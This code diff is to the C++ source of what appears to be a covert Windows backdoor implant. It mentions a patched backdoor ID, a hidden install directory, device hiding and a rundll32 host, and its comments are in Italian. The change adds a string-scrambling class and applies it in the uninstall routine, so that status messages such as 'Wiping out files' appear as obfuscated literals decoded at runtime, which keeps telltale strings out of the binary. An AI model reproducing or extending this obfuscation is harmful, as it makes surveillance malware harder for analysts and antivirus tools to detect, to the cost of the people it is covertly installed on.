@@ -3,6 +3,30 @@
 #include "AM_Core.h"
 #include "ASP.h"
 
+class ScrambleString
+{
+	public:
+	char *get_str()
+	{
+		if (string)
+			return string;
+		return "NIL";
+	}
+
+	ScrambleString(char *ob_str) 
+	{
+		string = LOG_ScrambleName(ob_str, 2, FALSE);
+	}
+
+	~ScrambleString(void)
+	{
+		SAFE_FREE(string);
+	}
+	
+	private:
+	char *string;
+};
+
 extern BOOL IsDeepFreeze();
 extern void UnlockConfFile();
 extern BYTE bin_patched_backdoor_id[];
@@ -251,6 +275,11 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 {
 	char conf_path[DLLNAMELEN];
 
+	ScrambleString ssok("QM\r\n"); // "OK\r\n"
+	ScrambleString ss1("_ 4vE77UPC 8WW oEidWl1.........."); // "- Stopping all modules.........."
+	ScrambleString ss2("_ jU7UPC Edv zUWl1.............."); // "- Wiping out files.............."
+	ScrambleString ss3("_ BWl8PUPC oloEtJ..............."); // "- Cleaning memory..............."
+
 	// Aspetta che il thread di azioni istantanee sia morto.
 	// A quel punto ha pieni poteri su tutto visto che viene gestita solo 
 	// dal thread principale (lo stesso che gestisce le sync)
@@ -265,12 +294,12 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 	// in TaskManager e nei nuovi explorer
 	// (che non influisce sulla disinstallazione)
 
-	REPORT_STATUS_LOG("- Stopping all agents...........");
+	REPORT_STATUS_LOG(ss1.get_str());
 	AM_SuspendRestart(AM_EXIT);
 	EventMonitorStopAll();    
-	REPORT_STATUS_LOG("OK\r\n");
+	REPORT_STATUS_LOG(ssok.get_str());
 
-	REPORT_STATUS_LOG("- Wiping out files..............");
+	REPORT_STATUS_LOG(ss2.get_str());
 	// Rimuove lo sfondo modificato, ma solo se compilato come demo
 	// va fatto qui, prima che cancelli i file nella dir nascosta
 	RemoveDesktopBackground();
@@ -283,9 +312,9 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 	// il computer venga spento mentre li sta rimuovendo
 	// (rimarrebbero i log sulla macchina).
 	HM_RemoveRegistryKey();
-	REPORT_STATUS_LOG("OK\r\n");
+	REPORT_STATUS_LOG(ssok.get_str());
 
-	REPORT_STATUS_LOG("- Cleaning memory...............");
+	REPORT_STATUS_LOG(ss3.get_str());
 
 	// Rimuove il file di configurazione.
 	// Lo rimuove dopo aver tolto la chiave del registry 
@@ -308,7 +337,7 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 		HideDevice dev_df;
 		DFUninstall(&dev_df, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME);
 	}
-	REPORT_STATUS_LOG("OK\r\n");
+	REPORT_STATUS_LOG(ssok.get_str());
 
 	// Fa terminare il processo host (rundll32)
 	ReportExitProcess();
